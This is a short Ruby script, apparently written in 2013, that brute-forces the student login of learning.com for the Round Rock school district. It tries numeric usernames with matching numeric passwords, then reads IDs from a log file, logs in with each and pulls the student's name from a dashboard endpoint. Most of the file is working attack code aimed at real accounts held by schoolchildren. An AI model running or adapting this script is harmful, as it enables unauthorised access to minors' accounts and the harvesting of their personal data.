#!/usr/bin/env ruby
# learning.com numerical ID brute force script by L8D
# Written sometime during 2013
#
# This script numerically bruteforces learning.com's login page with:
#   Username: {46,07}<number here>
#   Password: <number here>
#   District: Round Rock ISD
# by default, once it successfully logs in with an "ID", it appends that ID to the logfile, by default is "scriptlog.txt"
#
# Usage: ./[scriptname].rb <start>
#
# Also, I recommend running this with jruby for better thread concurrency
require 'mechanize'

## Program

def do_req_learning num, seq, dis
  a = Mechanize.new
  a.get 'http://platform.learning.com/LoginNew.htm' do |page|
    # Submit the login form
    page.form_with do |f|
      f.learningUserName = seq + num.to_s
      f.learningPassword = num.to_s
      f.learningDistrictName = dis
    end.click_button

    form = page.forms.first
    return if form.submit =~ /Error/
  end

  xml_address = 'http://platform.learning.com/Services/Ajax/Student/Student.asmx/GetAllDashboardInfo'
  xml = a.post xml_address, xml_address
  xml.at('Name').children[0].content
end

def get_student_name num
  do_req_learning num, "46", "Round Rock ISD"
end

log = open('scriptlog.txt', 'r').read

log.each_line do |num|
  puts "#{get_student_name num.to_i} #{num.to_s}"
end
